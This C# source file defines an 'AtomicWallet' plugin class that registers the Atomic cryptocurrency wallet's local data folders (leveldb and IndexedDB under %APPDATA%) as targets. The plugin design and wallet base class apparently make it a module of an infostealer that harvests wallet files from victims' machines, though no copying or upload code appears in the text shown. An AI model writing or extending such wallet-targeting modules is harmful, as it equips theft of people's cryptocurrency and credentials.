using System;
using System.Collections.Generic;
using System.IO;

namespace Plugin.Crypto
{
    public class AtomicWallet : CryptoWalletBase
    {
        public AtomicWallet()
        {
            walletName = "Atomic";
            
            // Atomic wallet paths
            walletPaths.Add("%APPDATA%\\atomic\\Local Storage\\leveldb");
            walletPaths.Add("%APPDATA%\\atomic\\IndexedDB");
        }
    }
}
